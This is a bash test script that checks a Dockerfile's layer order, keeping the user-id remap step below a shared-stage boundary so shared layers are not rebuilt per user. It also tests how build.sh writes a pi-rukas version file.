step_of() {
  awk -F '\t' -v want="$1" 'index($2, want) { print $1; exit }' <<<"$steps"
}
# The number the steps are counted against, taken from the same read so no second
# parser can disagree with the first. A file that lost the boundary answers `none`
# rather than 0, because 0 is a number every comparison below would answer without
# noticing: no step is less than 0, so the checks would pass for the want of one.
step_number=$(awk -F '\t' '$1 == "boundary" { print $2; exit }' <<<"$steps")
[ "$step_number" != none ] || t_bad "the image has no 'FROM shared' stage to count the steps against"
[ "$step_number" -gt 0 ] || t_bad "the image has no 'FROM shared' stage to count the steps against"
# The steps that read the uid, and the remap among them.
uid_steps=$(awk -F '\t' '$2 ~ /TEHAS_UID/ { print $1 }' <<<"$steps")
remap=$(step_of 'usermod -u "$TEHAS_UID"')
for name in 'apt-get install' 'codebase-memory-mcp --version' \
  'https://github.com/koalaman/shellcheck' 'https://github.com/jqlang/jq' \
  '/home/vscode/.cache/huggingface' 'vipune search' 'playwright install --with-deps'; do
  share=$(step_of "$name")
  [ "$share" != 0 ] || t_bad "no step of the image holds: $name"
  # A step of these layers that reads the uid is rebuilt for each instance user,
  # which is the whole cost this issue is about. It also tells the count below
  # that the file still holds the steps it names.
  case " $uid_steps " in *" $share "*) t_bad "the step holding $name reads the uid" ;; esac
done
# One step reads the uid, and it is the remap: a second one higher up would split
# the shared layers again. The remap is named here as well as above, so a file
# that lost it cannot pass by holding no step that reads the uid.
t_eq "$uid_steps" "$remap"
model=$(step_of '/home/vscode/.cache/huggingface')
# The remap comes after every layer that must not read the uid, the embedding
# model being the last of them. The steps below the remap are the checks run as
# the cycle's user and the answer for the base, none of which installs anything.
[ -n "$remap" ] || t_bad "the image has no remap step"
t_eq "$([ "$remap" -gt "$model" ] && echo late || echo early)" late
# The boundary the sharing rests on, named in the file the build reads: a stage
# that takes the layers above it, with the remap below it, and no second read of
# the uid above it. Without it the image is one stage, and everything under
# the remap is built again for each instance user.
t_eq "$(grep -cxF -- "$boundary" "$dockerfile")" 1
t_contains "$(cat "$T/docker-build-recipe")" "$boundary"
[ "$step_number" -gt "$model" ] || t_bad "the uid enters above the shared layers"
t_eq "$([ "$remap" -ge "$step_number" ] && echo below || echo above)" below
for name in 'playwright install --with-deps' 'vipune search'; do
  [ "$(step_of "$name")" -ge "$step_number" ] || t_bad "the step holding $name is above the boundary"
done
# The stronger half of the sharing: a step above the boundary may not hold the id
# the remap moves either, since a layer that carries it is a per-uid layer stored
# as a shared one. Only the remap names it, as the base id and the id it looks for
# in the image's own filesystem.
base_id=$(awk -F '\t' -v b="$step_number" '$1 < b && $2 ~ /(^|[^0-9])1000([^0-9]|$)/ { print $2 }' <<<"$steps")
[ -z "$base_id" ] || t_bad "a step above the boundary holds the id the remap moves: $base_id"

# The same read of the copy the build hands docker, so the property belongs to the
# recipe docker reads and not to the test's own staging of it: a staging that
# drifted from the tracked file would fail here rather than pass beside it.
build_steps=$(image_steps "$T/docker-build-recipe")
build_boundary=$(awk -F '\t' '$1 == "boundary" { print $2; exit }' <<<"$build_steps")
[ "$build_boundary" != none ] ||
  t_bad "the copy docker was handed has no 'FROM shared' stage"
[ "$build_boundary" -gt 0 ] ||
  t_bad "the copy docker was handed has no 'FROM shared' stage"
build_uid_steps=$(awk -F '\t' '$2 ~ /TEHAS_UID/ { print $1 }' <<<"$build_steps")
build_remap=$(awk -F '\t' 'index($2, "usermod -u") && index($2, "$TEHAS_UID") { print $1; exit }' <<<"$build_steps")
t_eq "$build_uid_steps" "$build_remap"
[ "$build_remap" -ge "$build_boundary" ] ||
  t_bad "in the copy docker was handed the remap stands above the boundary"
build_base_id=$(awk -F '\t' -v b="$build_boundary" '$1 < b && $2 ~ /(^|[^0-9])1000([^0-9]|$)/ { print $2 }' <<<"$build_steps")
[ -z "$build_base_id" ] ||
  t_bad "in the copy docker was handed a step above the boundary holds the id the remap moves: $build_base_id"

# The cut build.sh makes is the other half of the order: docker is handed one
# file whose shared half is the tracked file's steps up to the boundary and
# whose uid half is the steps below it, so a staged copy that moved a step from
# one side of the cut to the other would give one instance user another's
# layer. The steps of each half are asked for in the order they run, by one read
# of the tracked file and one of the copy, so a step slipped across the cut or
# reordered within a half is named rather than folded away by a sort.
tracked_shared=$(image_steps "$dockerfile" | awk -F '\t' '$1 == "comment" { next } $1 == "boundary" { exit } { print $2 }')
build_shared=$(image_steps "$T/docker-build-recipe" | awk -F '\t' '$1 == "comment" { next } $1 == "boundary" { exit } { print $2 }')
t_eq "$build_shared" "$tracked_shared"
tracked_rest=$(image_steps "$dockerfile" | awk -F '\t' '$1 == "comment" || $1 == "boundary" { next } { print $2 }')
build_rest=$(image_steps "$T/docker-build-recipe" | awk -F '\t' '$1 == "comment" || $1 == "boundary" { next } { print $2 }')
t_eq "$build_rest" "$tracked_rest"

# The footers of the front pages show the pi-rukas version of the image, from a
# file beside the pages the build writes on a host and never in the checkout.
t_case "a build on a host writes the pi-rukas version beside the pages"
setup
install_host_toolchain
mkdir -p "$T/home/tehas/fun"
rm -f "$T/home/tehas/fun/rukas-version.txt"
t_run "\"$home/build.sh\""
t_eq "$t_rc" 0
t_eq "$(cat "$T/home/tehas/fun/rukas-version.txt")" v0.14.0

t_case "an --if-moved with nothing to build writes the version of the current image"
setup
install_host_toolchain
mkdir -p "$T/home/tehas/fun"
echo v0.13.9 >"$T/home/tehas/fun/rukas-version.txt"
T_ENV=(LABEL=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa)
t_run "\"$home/build.sh\" --if-moved"
t_eq "$t_rc" 0
t_contains "$t_out" "is on aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
t_lacks "$(t_calls docker)" "build "
t_eq "$(cat "$T/home/tehas/fun/rukas-version.txt")" v0.14.0

t_case "an image that names no version takes the file away, and --check writes nothing"
setup
install_host_toolchain
mkdir -p "$T/home/tehas/fun"
echo v0.13.9 >"$T/home/tehas/fun/rukas-version.txt"
T_ENV=(LABEL=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa CAPS='{}')
t_run "\"$home/build.sh\" --check"
t_eq "$t_rc" 0
t_eq "$(cat "$T/home/tehas/fun/rukas-version.txt")" v0.13.9
t_run "\"$home/build.sh\" --if-moved"
t_eq "$t_rc" 0
t_eq "$(test -e "$T/home/tehas/fun/rukas-version.txt" && echo there)" ""
T_ENV=()

t_case "a build from the checkout writes no version file"
setup
t_run "$build"
t_eq "$t_rc" 0
t_eq "$(test -e "$T_ROOT/host/fun/rukas-version.txt" && echo there)" ""

t_done
